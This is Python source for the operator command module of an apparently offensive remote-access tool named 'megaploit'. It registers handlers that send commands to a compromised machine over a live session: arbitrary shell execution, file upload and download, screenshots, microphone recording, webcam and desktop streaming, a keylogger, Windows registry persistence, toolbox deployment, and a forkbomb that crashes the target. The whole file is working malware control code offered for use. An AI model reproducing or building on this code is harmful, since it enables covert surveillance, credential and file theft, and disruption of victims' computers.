"""
megaploit.server.commands
~~~~~~~~~~~~~~~~~~~~~~~~~
Every command that the operator can run against an active session.

Each handler receives (session, args) and returns a CommandResult.
The CLI calls dispatch(session, raw_input) and handles the result.
"""

from __future__ import annotations

import os
import socket
from dataclasses import dataclass

from megaploit.core.protocol import send_msg, recv_msg, send_file, recv_file
from megaploit.server.session import Session
from megaploit.core.config import MAX_RECORD_SECONDS
from megaploit.toolbox import runner as _runner


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass
class CommandResult:
    ok: bool
    output: str = ""
    close_session: bool = False


# ---------------------------------------------------------------------------
# Command registry
# ---------------------------------------------------------------------------

_registry: dict[str, "_CommandDef"] = {}


@dataclass
class _CommandDef:
    name: str
    usage: str
    help_text: str
    dangerous: bool
    handler: object  # Callable[[Session, list[str]], CommandResult]


def _cmd(name: str, usage: str = "", help_text: str = "", dangerous: bool = False):
    """Decorator to register a command handler."""
    def decorator(fn):
        _registry[name] = _CommandDef(
            name=name,
            usage=usage,
            help_text=help_text,
            dangerous=dangerous,
            handler=fn,
        )
        return fn
    return decorator


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _ok(msg: str = "") -> CommandResult:
    return CommandResult(ok=True, output=msg)

def _err(msg: str) -> CommandResult:
    return CommandResult(ok=False, output=msg)

def _fatal() -> CommandResult:
    return CommandResult(ok=True, output="", close_session=True)


# ---------------------------------------------------------------------------
# Handlers
# ---------------------------------------------------------------------------

@_cmd("help", usage="help", help_text="Show this help message")
def cmd_help(session: Session, args: list[str]) -> CommandResult:
    lines = ["", f"  {'COMMAND':<26}  DESCRIPTION"]
    lines.append(f"  {'─' * 26}  {'─' * 40}")
    for name, defn in sorted(_registry.items()):
        tag = " [!]" if defn.dangerous else ""
        lines.append(f"  {defn.usage or name:<26}  {defn.help_text}{tag}")
    lines.append("")
    lines.append("  [!] = Dangerous — requires explicit confirmation")
    lines.append("")
    return _ok("\n".join(lines))


@_cmd("exit", usage="exit", help_text="Terminate the agent session")
def cmd_exit(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "exit")
    return CommandResult(ok=True, output="[*] Session closed.", close_session=True)


@_cmd("sysinfo", usage="sysinfo", help_text="Retrieve OS, hostname, user, architecture")
def cmd_sysinfo(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "sysinfo")
    return _ok(recv_msg(session.conn))


@_cmd("cd", usage="cd <directory>", help_text="Change working directory on the target")
def cmd_cd(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: cd <directory>")
    send_msg(session.conn, f"cd {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("shell", usage="shell <command>", help_text="Execute an arbitrary shell command")
def cmd_shell(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: shell <command>")
    send_msg(session.conn, " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("upload", usage="upload <local_file>", help_text="Send a local file to the target")
def cmd_upload(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: upload <local_file>")
    path = args[0]
    if not os.path.isfile(path):
        return _err(f"File not found: {path}")
    send_msg(session.conn, f"upload {os.path.basename(path)}")
    send_file(session.conn, path)
    return _ok(f"[+] Uploaded '{path}'")


@_cmd("download", usage="download <remote_file>", help_text="Retrieve a file from the target")
def cmd_download(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: download <remote_file>")
    remote = args[0]
    local = session.download_path(remote)
    send_msg(session.conn, f"download {remote}")
    try:
        recv_file(session.conn, local, timeout=60)
        return _ok(f"[+] Saved to: {local}")
    except (socket.timeout, ConnectionError) as e:
        return _err(f"[-] Download failed: {e}")


@_cmd("screenshot", usage="screenshot", help_text="Capture a screenshot from the target")
def cmd_screenshot(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "screenshot")
    local = session.screenshot_path()
    try:
        recv_file(session.conn, local, timeout=20)
        return _ok(f"[+] Screenshot saved: {local}")
    except (socket.timeout, ConnectionError) as e:
        return _err(f"[-] Screenshot failed: {e}")


@_cmd("record", usage="record <seconds>", help_text="Record microphone audio (max 300s)")
def cmd_record(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or not args[0].isdigit():
        return _err("Usage: record <seconds>")
    seconds = int(args[0])
    if seconds > MAX_RECORD_SECONDS:
        return _err(f"[-] Max recording length is {MAX_RECORD_SECONDS}s")
    local = session.recording_path()
    send_msg(session.conn, f"record {seconds}")
    try:
        recv_file(session.conn, local, timeout=seconds + 20)
        return _ok(f"[+] Recording saved: {local}")
    except (socket.timeout, ConnectionError) as e:
        return _err(f"[-] Recording failed: {e}")


@_cmd("screen_stream", usage="screen_stream <on|off>",
      help_text="Start/stop desktop stream at http://<target>:5000")
def cmd_screen_stream(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return _err("Usage: screen_stream <on|off>")
    send_msg(session.conn, f"screen_stream {args[0]}")
    resp = recv_msg(session.conn)
    label = "started" if args[0] == "on" else "stopped"
    return _ok(f"[+] Screen stream {label} — {resp}")


@_cmd("webcam", usage="webcam <on|off>",
      help_text="Start/stop webcam stream at http://<target>:5001")
def cmd_webcam(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return _err("Usage: webcam <on|off>")
    send_msg(session.conn, f"webcam {args[0]}")
    resp = recv_msg(session.conn)
    label = "started" if args[0] == "on" else "stopped"
    return _ok(f"[+] Webcam {label} — {resp}")


@_cmd("persist", usage="persist <regname> <filename>",
      help_text="Install Windows registry persistence (Windows only)")
def cmd_persist(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2:
        return _err("Usage: persist <regname> <filename>")
    send_msg(session.conn, f"persist {args[0]} {args[1]}")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_start", usage="keylog_start", help_text="Start the keylogger on the target")
def cmd_keylog_start(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_start")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_dump", usage="keylog_dump", help_text="Dump captured keystrokes")
def cmd_keylog_dump(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_dump")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_stop", usage="keylog_stop", help_text="Stop keylogger and delete its log")
def cmd_keylog_stop(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_stop")
    return _ok(recv_msg(session.conn))


@_cmd("forkbomb", usage="forkbomb", help_text="Crash the target (Unix only)", dangerous=True)
def cmd_forkbomb(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "forkbomb")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Toolbox — session-context commands
# ---------------------------------------------------------------------------

@_cmd(
    "toolbox_run",
    usage="toolbox_run <name> [args…]",
    help_text="Run a toolbox tool locally, targeting the active session's IP",
)
def cmd_toolbox_run(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: toolbox_run <tool-name> [args…]")
    name = args[0]
    tool_args = args[1:]
    lines: list[str] = []

    try:
        _runner.run_local(name, tool_args, output=lines.append)
    except RuntimeError as e:
        return _err(str(e))

    return _ok("\n".join(lines))


@_cmd(
    "toolbox_deploy",
    usage="toolbox_deploy <name> [args…]",
    help_text="Upload tool entry-point to target and execute it there",
)
def cmd_toolbox_deploy(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: toolbox_deploy <tool-name> [args…]")
    name = args[0]
    tool_args = args[1:]
    lines: list[str] = []

    try:
        _runner.run_remote(name, tool_args, session, output=lines.append)
    except RuntimeError as e:
        return _err(str(e))

    return _ok("\n".join(lines))


# ---------------------------------------------------------------------------
# Dispatcher
# ---------------------------------------------------------------------------

def dispatch(session: Session, raw: str) -> CommandResult:
    """
    Parse *raw* input, find the matching handler, and call it.
    Unknown tokens are forwarded as shell commands.
    """
    parts = raw.strip().split()
    if not parts:
        return _ok()

    name = parts[0].lower()
    args = parts[1:]

    if name in _registry:
        try:
            return _registry[name].handler(session, args)
        except ConnectionError:
            return CommandResult(ok=False, output="[-] Connection lost.", close_session=True)
        except Exception as e:
            return _err(f"[-] Error: {e}")
    else:
        # forward raw input as a shell command via the generic path
        try:
            send_msg(session.conn, raw)
            return _ok(recv_msg(session.conn))
        except ConnectionError:
            return CommandResult(ok=False, output="[-] Connection lost.", close_session=True)
        except Exception as e:
            return _err(f"[-] Error: {e}")


def all_commands() -> dict[str, _CommandDef]:
    return dict(_registry)
